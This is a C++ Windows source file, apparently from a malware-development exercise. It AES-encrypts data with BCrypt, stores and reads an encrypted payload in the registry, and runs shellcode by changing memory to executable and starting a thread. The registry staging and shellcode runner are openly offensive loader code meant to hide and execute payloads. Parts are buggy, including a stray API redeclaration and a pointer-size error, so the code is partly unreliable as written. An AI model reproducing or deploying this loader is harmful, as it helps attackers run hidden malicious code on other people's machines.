#include <windows.h>
#include <cstdio>
#include <ctime>
#include <bcrypt.h>
#pragma comment(lib, "bcrypt.lib") 
typedef struct _AES {

	PBYTE	pPlainText;         // base address of the plain text data 
	DWORD	dwPlainSize;        // size of the plain text data
	PBYTE	pCipherText;        // base address of the encrypted data	
	DWORD	dwCipherSize;       // size of it (this can change from dwPlainSize in case there was padding)
	PBYTE	pKey;               // the 32 byte key
	PBYTE	pIv;                // the 16 byte iv
} AES, * PAES;

#define KEYSIZE 32
#define IVSIZE  16
#define REGISTRY  "Software\\MyKey"
#define REGSTRING "Payload"
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)   
// The encryption implementation
BOOL InstallAesEncryption(PAES pAes) {

	BOOL                  bSTATE = TRUE;
	BCRYPT_ALG_HANDLE     hAlgorithm = NULL;
	BCRYPT_KEY_HANDLE     hKeyHandle = NULL;

	ULONG       		cbResult = NULL;
	DWORD       		dwBlockSize = NULL;

	DWORD       		cbKeyObject = NULL;
	PBYTE       		pbKeyObject = NULL;

	PBYTE      		pbCipherText = NULL;
	DWORD       		cbCipherText = NULL,


		// Intializing "hAlgorithm" as AES algorithm Handle
		STATUS = BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0);
	if (!NT_SUCCESS(STATUS)) {
		printf("[!] BCryptOpenAlgorithmProvider Failed With Error: 0x%0.8X \n", STATUS);
		bSTATE = FALSE; goto _EndOfFunc;
	}

	// Getting the size of the key object variable pbKeyObject. This is used by the BCryptGenerateSymmetricKey function later 
	STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbResult, 0);
	if (!NT_SUCCESS(STATUS)) {
		printf("[!] BCryptGetProperty[1] Failed With Error: 0x%0.8X \n", STATUS);
		bSTATE = FALSE; goto _EndOfFunc;
	}

	// Getting the size of the block used in the encryption. Since this is AES it must be 16 bytes.
	STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_BLOCK_LENGTH, (PBYTE)&dwBlockSize, sizeof(DWORD), &cbResult, 0);
	if (!NT_SUCCESS(STATUS)) {
		printf("[!] BCryptGetProperty[2] Failed With Error: 0x%0.8X \n", STATUS);
		bSTATE = FALSE; goto _EndOfFunc;
	}

	// Checking if block size is 16 bytes
	if (dwBlockSize != 16) {
		bSTATE = FALSE; goto _EndOfFunc;
	}

	// Allocating memory for the key object 
	pbKeyObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbKeyObject);
	if (pbKeyObject == NULL) {
		bSTATE = FALSE; goto _EndOfFunc;
	}

	// Setting Block Cipher Mode to CBC. This uses a 32 byte key and a 16 byte IV.
	STATUS = BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
	if (!NT_SUCCESS(STATUS)) {
		printf("[!] BCryptSetProperty Failed With Error: 0x%0.8X \n", STATUS);
		bSTATE = FALSE; goto _EndOfFunc;
	}

	// Generating the key object from the AES key "pAes->pKey". The output will be saved in pbKeyObject and will be of size cbKeyObject 
	STATUS = BCryptGenerateSymmetricKey(hAlgorithm, &hKeyHandle, pbKeyObject, cbKeyObject, (PBYTE)pAes->pKey, KEYSIZE, 0);
	if (!NT_SUCCESS(STATUS)) {
		printf("[!] BCryptGenerateSymmetricKey Failed With Error: 0x%0.8X \n", STATUS);
		bSTATE = FALSE; goto _EndOfFunc;
	}

	// Running BCryptEncrypt first time with NULL output parameters to retrieve the size of the output buffer which is saved in cbCipherText
	STATUS = BCryptEncrypt(hKeyHandle, (PUCHAR)pAes->pPlainText, (ULONG)pAes->dwPlainSize, NULL, pAes->pIv, IVSIZE, NULL, 0, &cbCipherText, BCRYPT_BLOCK_PADDING);
	if (!NT_SUCCESS(STATUS)) {
		printf("[!] BCryptEncrypt[1] Failed With Error: 0x%0.8X \n", STATUS);
		bSTATE = FALSE; goto _EndOfFunc;
	}

	// Allocating enough memory for the output buffer, cbCipherText
	pbCipherText = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbCipherText);
	if (pbCipherText == NULL) {
		bSTATE = FALSE; goto _EndOfFunc;
	}

	// Running BCryptEncrypt again with pbCipherText as the output buffer
	STATUS = BCryptEncrypt(hKeyHandle, (PUCHAR)pAes->pPlainText, (ULONG)pAes->dwPlainSize, NULL, pAes->pIv, IVSIZE, pbCipherText, cbCipherText, &cbResult, BCRYPT_BLOCK_PADDING);
	if (!NT_SUCCESS(STATUS)) {
		printf("[!] BCryptEncrypt[2] Failed With Error: 0x%0.8X \n", STATUS);
		bSTATE = FALSE; goto _EndOfFunc;
	}


	// Clean up
_EndOfFunc:
	if (hKeyHandle)
		BCryptDestroyKey(hKeyHandle);
	if (hAlgorithm)
		BCryptCloseAlgorithmProvider(hAlgorithm, 0);
	if (pbKeyObject)
		HeapFree(GetProcessHeap(), 0, pbKeyObject);
	if (pbCipherText != NULL && bSTATE) {
		// If everything worked, save pbCipherText and cbCipherText 
		pAes->pCipherText = pbCipherText;
		pAes->dwCipherSize = cbCipherText;
	}
	return bSTATE;
}
// The decryption implementation
BOOL InstallAesDecryption(PAES pAes) {

	BOOL                  bSTATE = TRUE;
	BCRYPT_ALG_HANDLE     hAlgorithm = NULL;
	BCRYPT_KEY_HANDLE     hKeyHandle = NULL;

	ULONG                 cbResult = NULL;
	DWORD                 dwBlockSize = NULL;

	DWORD                 cbKeyObject = NULL;
	PBYTE                 pbKeyObject = NULL;

	PBYTE                 pbPlainText = NULL;
	DWORD                 cbPlainText = NULL,

		// Intializing "hAlgorithm" as AES algorithm Handle
		STATUS = BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0);
	if (!NT_SUCCESS(STATUS)) {
		printf("[!] BCryptOpenAlgorithmProvider Failed With Error: 0x%0.8X \n", STATUS);
		bSTATE = FALSE; goto _EndOfFunc;
	}

	// Getting the size of the key object variable pbKeyObject. This is used by the BCryptGenerateSymmetricKey function later
	STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbResult, 0);
	if (!NT_SUCCESS(STATUS)) {
		printf("[!] BCryptGetProperty[1] Failed With Error: 0x%0.8X \n", STATUS);
		bSTATE = FALSE; goto _EndOfFunc;
	}

	// Getting the size of the block used in the encryption. Since this is AES it should be 16 bytes.
	STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_BLOCK_LENGTH, (PBYTE)&dwBlockSize, sizeof(DWORD), &cbResult, 0);
	if (!NT_SUCCESS(STATUS)) {
		printf("[!] BCryptGetProperty[2] Failed With Error: 0x%0.8X \n", STATUS);
		bSTATE = FALSE; goto _EndOfFunc;
	}

	// Checking if block size is 16 bytes
	if (dwBlockSize != 16) {
		bSTATE = FALSE; goto _EndOfFunc;
	}

	// Allocating memory for the key object 
	pbKeyObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbKeyObject);
	if (pbKeyObject == NULL) {
		bSTATE = FALSE; goto _EndOfFunc;
	}

	// Setting Block Cipher Mode to CBC. This uses a 32 byte key and a 16 byte IV.
	STATUS = BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
	if (!NT_SUCCESS(STATUS)) {
		printf("[!] BCryptSetProperty Failed With Error: 0x%0.8X \n", STATUS);
		bSTATE = FALSE; goto _EndOfFunc;
	}

	// Generating the key object from the AES key "pAes->pKey". The output will be saved in pbKeyObject of size cbKeyObject 
	STATUS = BCryptGenerateSymmetricKey(hAlgorithm, &hKeyHandle, pbKeyObject, cbKeyObject, (PBYTE)pAes->pKey, KEYSIZE, 0);
	if (!NT_SUCCESS(STATUS)) {
		printf("[!] BCryptGenerateSymmetricKey Failed With Error: 0x%0.8X \n", STATUS);
		bSTATE = FALSE; goto _EndOfFunc;
	}

	// Running BCryptDecrypt first time with NULL output parameters to retrieve the size of the output buffer which is saved in cbPlainText
	STATUS = BCryptDecrypt(hKeyHandle, (PUCHAR)pAes->pCipherText, (ULONG)pAes->dwCipherSize, NULL, pAes->pIv, IVSIZE, NULL, 0, &cbPlainText, BCRYPT_BLOCK_PADDING);
	if (!NT_SUCCESS(STATUS)) {
		printf("[!] BCryptDecrypt[1] Failed With Error: 0x%0.8X \n", STATUS);
		bSTATE = FALSE; goto _EndOfFunc;
	}

	// Allocating enough memory for the output buffer, cbPlainText
	pbPlainText = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbPlainText);
	if (pbPlainText == NULL) {
		bSTATE = FALSE; goto _EndOfFunc;
	}

	// Running BCryptDecrypt again with pbPlainText as the output buffer
	STATUS = BCryptDecrypt(hKeyHandle, (PUCHAR)pAes->pCipherText, (ULONG)pAes->dwCipherSize, NULL, pAes->pIv, IVSIZE, pbPlainText, cbPlainText, &cbResult, BCRYPT_BLOCK_PADDING);
	if (!NT_SUCCESS(STATUS)) {
		printf("[!] BCryptDecrypt[2] Failed With Error: 0x%0.8X \n", STATUS);
		bSTATE = FALSE; goto _EndOfFunc;
	}

	// Clean up
_EndOfFunc:
	if (hKeyHandle)
		BCryptDestroyKey(hKeyHandle);
	if (hAlgorithm)
		BCryptCloseAlgorithmProvider(hAlgorithm, 0);
	if (pbKeyObject)
		HeapFree(GetProcessHeap(), 0, pbKeyObject);
	if (pbPlainText != NULL && bSTATE) {
		// if everything went well, we save pbPlainText and cbPlainText
		pAes->pPlainText = pbPlainText;
		pAes->dwPlainSize = cbPlainText;
	}
	return bSTATE;

}
// Print the input buffer as a hex char array
VOID PrintHexData(LPCSTR Name, PBYTE Data, SIZE_T Size) {

	printf("unsigned char %s[] = {", Name);

	for (int i = 0; i < Size; i++) {
		if (i % 16 == 0)
			printf("\n\t");

		if (i < Size - 1) {
			printf("0x%0.2X, ", Data[i]);
		}
		else
			printf("0x%0.2X ", Data[i]);
		}

		printf("};\n\n\n");

	}
	// Generate random bytes of size sSize
VOID GenerateRandomBytes(PBYTE pByte, SIZE_T sSize) {

		for (int i = 0; i < sSize; i++) {
			pByte[i] = (BYTE)rand() % 0xFF;
		}

	}
LSTATUS RegGetValueA(
     HKEY    hkey,     // A handle to an open registry key
	 LPCSTR  lpSubKey, // The path of a registry key relative to the key specified by the hkey parameter
	 LPCSTR  lpValue,  // The name of the registry value.
	 DWORD   dwFlags,  // The flags that restrict the data type of value to be queried
	 LPDWORD pdwType,  // A pointer to a variable that receives a code indicating the type of data stored in the specified value
	 PVOID   pvData,   // A pointer to a buffer that receives the value's data
	 LPDWORD pcbData   // A pointer to a variable that specifies the size of the buffer pointed to by the pvData parameter, in bytes
);

#define WRITEMODE

#ifdef WRITEMODE
// encryption 
unsigned char* Data = (unsigned char*)REGSTRING;

// Wrapper function for InstallAesEncryption that makes things easier
BOOL SimpleEncryption(IN PVOID pPlainTextData, IN DWORD sPlainTextSize, IN PBYTE pKey, IN PBYTE pIv, OUT PVOID* pCipherTextData, OUT DWORD* sCipherTextSize) {

	if (pPlainTextData == NULL || sPlainTextSize == NULL || pKey == NULL || pIv == NULL)
		return FALSE;

	// Intializing the struct
	AES Aes = {
		.pPlainText = (PBYTE)pPlainTextData,
		.dwPlainSize = sPlainTextSize,
		.pKey = pKey,
		.pIv = pIv
	};

	if (!InstallAesEncryption(&Aes)) {
		return FALSE;
	}

	// Saving output
	*pCipherTextData = Aes.pCipherText;
	*sCipherTextSize = Aes.dwCipherSize;

	return TRUE;
}
// write to registry
#endif

#define readmode
#ifdef readmode

BOOL SimpleDecryption(IN PVOID pCipherTextData, IN DWORD sCipherTextSize, IN PBYTE pKey, IN PBYTE pIv, OUT PVOID* pPlainTextData, OUT DWORD* sPlainTextSize) {

	if (pCipherTextData == NULL || sCipherTextSize == NULL || pKey == NULL || pIv == NULL)
		return FALSE;

	// Intializing the struct
	AES Aes = {
		.pCipherText = (PBYTE)pCipherTextData,
		.dwCipherSize = sCipherTextSize,
		.pKey = pKey,
		.pIv = pIv
};

	if (!InstallAesDecryption(&Aes)) {
		return FALSE;
	}

	// Saving output
	*pPlainTextData = Aes.pPlainText;
	*sPlainTextSize = Aes.dwPlainSize;

	return TRUE;
}
BOOL ReadShellcodeFromRegistry(IN DWORD sPayloadSize, OUT PBYTE* ppPayload) {

	LSTATUS     STATUS = NULL;
	DWORD       dwBytesRead = sPayloadSize;
	PVOID       pBytes = NULL;


	pBytes = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sPayloadSize);
	if (pBytes == NULL) {
		printf("[!] HeapAlloc Failed With Error : %d\n", GetLastError());
		return FALSE;
	}

	STATUS = RegGetValueA(HKEY_CURRENT_USER, REGISTRY, REGSTRING, RRF_RT_ANY, NULL, pBytes, &dwBytesRead);
	if (ERROR_SUCCESS != STATUS) {
		printf("[!] RegGetValueA Failed With Error : %d\n", STATUS);
		return FALSE;
	}

	if (sPayloadSize != dwBytesRead) {
		printf("[!] Total Bytes Read : %d ; Instead Of Reading : %d\n", dwBytesRead, sPayloadSize);
		return FALSE;
	}

	*ppPayload = (PBYTE)pBytes;

	return TRUE;
}
BOOL RunShellcode(IN PVOID pDecryptedShellcode, IN SIZE_T sDecryptedShellcodeSize) {

	PVOID pShellcodeAddress = NULL;
	DWORD dwOldProtection = NULL;

	pShellcodeAddress = VirtualAlloc(NULL, sDecryptedShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pShellcodeAddress == NULL) {
		printf("[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	printf("[i] Allocated Memory At : 0x%p \n", pShellcodeAddress);

	memcpy(pShellcodeAddress, pDecryptedShellcode, sDecryptedShellcodeSize);
	memset(pDecryptedShellcode, '\0', sDecryptedShellcodeSize);

	if (!VirtualProtect(pShellcodeAddress, sDecryptedShellcodeSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("[!] VirtualProtect Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	printf("[#] Press <Enter> To Run ... ");
	getchar();

	if (CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)pShellcodeAddress, NULL, NULL, NULL) == NULL) {
		printf("[!] CreateThread Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	return TRUE;
}
#endif // readmode


int main() {

	BYTE pKey[KEYSIZE];                    // KEYSIZE is 32 bytes
	BYTE pIv[IVSIZE];                      // IVSIZE is 16 bytes

	srand(time(NULL));                      // The seed to generate the key. This is used to further randomize the key.
	GenerateRandomBytes(pKey, KEYSIZE);     // Generating a key with the helper function

	srand(time(NULL) ^ pKey[0]);            // The seed to generate the IV. Use the first byte of the key to add more randomness.
	GenerateRandomBytes(pIv, IVSIZE);       // Generating the IV with the helper function

	// Printing both key and IV onto the console 
	PrintHexData("pKey", pKey, KEYSIZE);
	PrintHexData("pIv", pIv, IVSIZE);

	// Defining two variables the output buffer and its respective size which will be used in SimpleEncryption
	PVOID pCipherText = NULL;
	DWORD dwCipherSize = NULL;

	// Encrypting
	if (!SimpleEncryption(Data, sizeof(Data), pKey, pIv, &pCipherText, &dwCipherSize)) {
		return -1;
	}

	// Print the encrypted buffer as a hex array
	PrintHexData("CipherText", (PBYTE)pCipherText, dwCipherSize);

	// Clean up
	HeapFree(GetProcessHeap(), 0, pCipherText);
	system("PAUSE");
	return 0;
}